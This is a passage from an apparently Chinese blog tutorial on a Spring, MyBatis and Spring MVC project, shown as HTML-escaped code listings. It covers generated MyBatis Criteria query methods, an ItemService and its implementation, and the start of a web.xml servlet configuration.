            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;username &amp;lt;=&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameLike(String value) {
            addCriterion(&lt;/span&gt;&quot;username like&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;username not like&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andUsernameIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;username in&quot;, values, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andUsernameNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;username not in&quot;, values, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;username between&quot;, value1, value2, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;username not between&quot;, value1, value2, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayIsNull() {
            addCriterion(&lt;/span&gt;&quot;birthday is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;birthday is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayEqualTo(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday =&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayNotEqualTo(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday &amp;lt;&amp;gt;&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayGreaterThan(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday &amp;gt;&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayGreaterThanOrEqualTo(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday &amp;gt;=&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayLessThan(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday &amp;lt;&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayLessThanOrEqualTo(Date value) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday &amp;lt;=&quot;, value, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andBirthdayIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday in&quot;, values, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andBirthdayNotIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday not in&quot;, values, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayBetween(Date value1, Date value2) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday between&quot;, value1, value2, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andBirthdayNotBetween(Date value1, Date value2) {
            addCriterionForJDBCDate(&lt;/span&gt;&quot;birthday not between&quot;, value1, value2, &quot;birthday&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexIsNull() {
            addCriterion(&lt;/span&gt;&quot;sex is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;sex is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;sex =&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;sex &amp;lt;&amp;gt;&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;sex &amp;gt;&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;sex &amp;gt;=&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;sex &amp;lt;&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;sex &amp;lt;=&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexLike(String value) {
            addCriterion(&lt;/span&gt;&quot;sex like&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;sex not like&quot;, value, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andSexIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;sex in&quot;, values, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andSexNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;sex not in&quot;, values, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;sex between&quot;, value1, value2, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andSexNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;sex not between&quot;, value1, value2, &quot;sex&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressIsNull() {
            addCriterion(&lt;/span&gt;&quot;address is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;address is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;address =&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;address &amp;lt;&amp;gt;&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;address &amp;gt;&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;address &amp;gt;=&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;address &amp;lt;&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;address &amp;lt;=&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressLike(String value) {
            addCriterion(&lt;/span&gt;&quot;address like&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;address not like&quot;, value, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andAddressIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;address in&quot;, values, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andAddressNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;address not in&quot;, values, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;address between&quot;, value1, value2, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andAddressNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;address not between&quot;, value1, value2, &quot;address&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Criteria &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; GeneratedCriteria {

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Criterion {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String condition;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object value;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object secondValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; noValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; singleValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; betweenValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; listValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String typeHandler;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getCondition() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; condition;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getSecondValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; secondValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isNoValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; noValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isSingleValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; singleValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isBetweenValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; betweenValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isListValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; listValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getTypeHandler() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; typeHandler;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.noValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value &lt;span&gt;instanceof&lt;/span&gt; List&amp;lt;?&amp;gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.listValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.singleValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.secondValue =&lt;span&gt; secondValue;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.betweenValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, secondValue, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;com.cyb.ssm.service&lt;/h3&gt;
&lt;p&gt;路径：src/main/java&lt;/p&gt;
&lt;h4&gt;ItemService.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.Item;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; ItemService {
    List&lt;/span&gt;&amp;lt;Item&amp;gt;&lt;span&gt; queryItemList();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;ItemServiceImpl.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.mapper.ItemMapper;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.Item;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.ItemExample;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.ItemExample.Criteria;
@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ItemServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; ItemService {

    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; ItemMapper mapper;
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Item&amp;gt;&lt;span&gt; queryItemList() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用逆向工程代码完成持久层查询&lt;/span&gt;
        ItemExample example=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ItemExample();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        Criteria criteria = example.createCriteria();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        criteria.andIdEqualTo(1);&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; mapper.selectByExample(example);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;web.xml&lt;/h2&gt;
&lt;p&gt;路径：src/main/webapp/WEB-INF/web.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;web-app &lt;/span&gt;&lt;span&gt;xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://java.sun.com/xml/ns/javaee&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;&lt;/span&gt;&lt;span&gt;
    version&lt;/span&gt;&lt;span&gt;=&quot;2.5&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置前端控制器加载spring子容器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;ssm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.servlet.DispatcherServlet&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
